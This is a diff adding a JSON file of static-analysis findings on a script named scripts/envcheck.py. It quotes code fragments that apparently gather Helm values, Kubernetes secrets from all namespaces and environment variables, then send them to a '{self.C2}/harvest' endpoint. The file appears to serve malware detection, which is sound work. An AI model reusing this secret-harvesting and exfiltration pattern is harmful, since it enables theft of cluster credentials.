@@ -1,0 +1,367 @@
+[
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "collected = {\"hostname\": socket.gethostname()}",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::scripts/envcheck.py::connection_create::collected = {\"hostname\": socket.gethostname()}": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::scripts/envcheck.py::connection_create::collected = {\"hostname\": socket.gethostname()}",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "socket.gethostname()",
+      "sink_callsite_id": "scripts/envcheck.py:17:17:socket.gethostname()",
+      "source_end_line": 17,
+      "source_start_line": 17
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00000"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::scripts/envcheck.py::connection_create::collected = {\"hostname\": socket.gethostname()}"
+    ],
+    "sso_id": "sso_00000",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "r = subprocess.run([\"helm\", \"list\", \"--all-namespaces\", \"-o\", \"json\"],\n                              capture_output=True, text=True, timeout=15)",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::system_command_execution::21": "command"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::system_command_execution::21",
+      "parameter_bindings": [],
+      "sink_callsite_id": "scripts/envcheck.py:21:22:subprocess.run()",
+      "source_end_line": 22,
+      "source_start_line": 21
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00001"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::system_command_execution::21"
+    ],
+    "sso_id": "sso_00001",
+    "subtype": "system_command_execution"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "rv = subprocess.run(\n                            [\"helm\", \"get\", \"values\", name, \"-n\", ns, \"-o\", \"json\", \"--all\"],\n                            capture_output=True, text=True, timeout=10\n                        )",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::system_command_execution::31": "command"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::system_command_execution::31",
+      "parameter_bindings": [],
+      "sink_callsite_id": "scripts/envcheck.py:31:34:subprocess.run()",
+      "source_end_line": 34,
+      "source_start_line": 31
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00002"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::system_command_execution::31"
+    ],
+    "sso_id": "sso_00002",
+    "subtype": "system_command_execution"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "matched_text": "for root, dirs, files in os.walk(d):",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::file_search::48": "path"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::file_search::48",
+      "path_class": "ordinary",
+      "source_end_line": 48,
+      "source_start_line": 48
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00003"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::file_search::48"
+    ],
+    "sso_id": "sso_00003",
+    "subtype": "file_search"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(fpath) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::file_access::52": "path"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::file_access::52",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 52,
+      "source_start_line": 52
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00004"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::file_access::52"
+    ],
+    "sso_id": "sso_00004",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "r = subprocess.run(\n                [\"kubectl\", \"get\", \"secrets\", \"--all-namespaces\", \"-l\", \"owner=helm\", \"-o\", \"json\"],\n                capture_output=True, text=True, timeout=15\n            )",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::system_command_execution::59": "command"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::system_command_execution::59",
+      "parameter_bindings": [],
+      "sink_callsite_id": "scripts/envcheck.py:59:62:subprocess.run()",
+      "source_end_line": 62,
+      "source_start_line": 59
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00005"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::system_command_execution::59"
+    ],
+    "sso_id": "sso_00005",
+    "subtype": "system_command_execution"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "matched_text": "v = os.environ.get(k)",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::scripts/envcheck.py::v": "path"
+      },
+      "operation_object": "obj::symbolic_reference::scripts/envcheck.py::v",
+      "secret_class": "unknown",
+      "sensitivity_class": "contextual",
+      "source_end_line": 72,
+      "source_start_line": 72
+    },
+    "category": "sensitive_data_access",
+    "finding_ids": [
+      "semgrep_00006"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::scripts/envcheck.py::v"
+    ],
+    "sso_id": "sso_00006",
+    "subtype": "environment_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "matched_text": "for root, dirs, files in os.walk(search_dir):",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::file_search::85": "path"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::file_search::85",
+      "path_class": "ordinary",
+      "source_end_line": 85,
+      "source_start_line": 85
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00007"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::file_search::85"
+    ],
+    "sso_id": "sso_00007",
+    "subtype": "file_search"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(hook_template, \"w\") as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::file_access::96": "path"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::file_access::96",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 96,
+      "source_start_line": 96
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00008"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::file_access::96"
+    ],
+    "sso_id": "sso_00008",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::scripts/envcheck.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::scripts/envcheck.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "urllib.request.Request()",
+      "sink_callsite_id": "scripts/envcheck.py:107:111:urllib.request.Request()",
+      "source_end_line": 111,
+      "source_start_line": 107
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00009"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::scripts/envcheck.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )"
+    ],
+    "sso_id": "sso_00009",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "urllib.request.urlopen(req, timeout=10)",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::scripts/envcheck.py::connection_create::urllib.request.urlopen(req, timeout=10)": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::scripts/envcheck.py::connection_create::urllib.request.urlopen(req, timeout=10)",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "urllib.request.urlopen()",
+      "sink_callsite_id": "scripts/envcheck.py:112:112:urllib.request.urlopen()",
+      "source_end_line": 112,
+      "source_start_line": 112
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00010"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::scripts/envcheck.py::connection_create::urllib.request.urlopen(req, timeout=10)"
+    ],
+    "sso_id": "sso_00010",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      "scripts/envcheck.py"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "return subprocess.run([\"helm\", \"install\", name, chart, \"-n\", namespace], capture_output=True, text=True)",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::scripts/envcheck.py::system_command_execution::118": "command"
+      },
+      "operation_object": "obj::operation::scripts/envcheck.py::system_command_execution::118",
+      "parameter_bindings": [],
+      "sink_callsite_id": "scripts/envcheck.py:118:118:subprocess.run()",
+      "source_end_line": 118,
+      "source_start_line": 118
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00011"
+    ],
+    "operand_ids": [
+      "obj::operation::scripts/envcheck.py::system_command_execution::118"
+    ],
+    "sso_id": "sso_00011",
+    "subtype": "system_command_execution"
+  }
+]
